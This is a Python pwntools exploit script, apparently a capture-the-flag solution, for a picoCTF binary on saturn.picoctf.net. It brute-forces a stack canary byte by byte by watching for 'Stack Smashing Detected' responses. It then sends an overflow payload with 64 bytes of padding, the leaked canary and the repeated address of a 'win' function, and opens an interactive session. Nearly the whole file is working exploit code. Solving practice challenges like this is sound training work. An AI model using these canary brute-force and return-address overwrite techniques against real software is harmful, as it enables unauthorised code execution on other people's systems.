from pwn import *
import time as tm
import string
local = False
fname = './vuln'

context(terminal=['tmux','new-window'])                                                                           
host = 'saturn.picoctf.net'
port = 62075

p = ELF(fname)
#r = process(fname) if local else remote('saturn.picoctf.net',60055)

def send_length(l):
	#log.info('sending length')
	log.info(r.recvuntil('> '))
	r.sendline(l)

def send(payload):
	#log.info('sending mal. payload')
	r.recvuntil('> ')
	r.sendline(payload)
def send_leak_payload(payload,i):
	#log.info('sending mal. payload')
	r.recvuntil('> ')

	r.send(payload+b'\n'+i)
	rec_str = r.recvline()
	return  rec_str


if __name__=='__main__':

	leak_canary = b''
	for l in range(4):
		for i in string.ascii_lowercase+string.ascii_uppercase:
			r = process(fname) if local else remote(host,port,level = 'error')

			try:
				send(b'120')
				#gdb.attach(r)
				rec_str = send_leak_payload(b'a'*63,leak_canary+i.encode())
			except: 
				continue
			#log.info('out = {}'.format(rec_str))
			if b'Stack Smashing Detected' in rec_str:
			
				r.close()
			else:
				r.close()
				leak_canary+=i.encode()
				log.info('Canary found = {}'.format(leak_canary))
				break
		

	r = process(fname) if local else remote(host,port)
	send(b'120')
	send(b'a'*64+leak_canary+p32(p.sym['win'])*5)
	r.interactive()






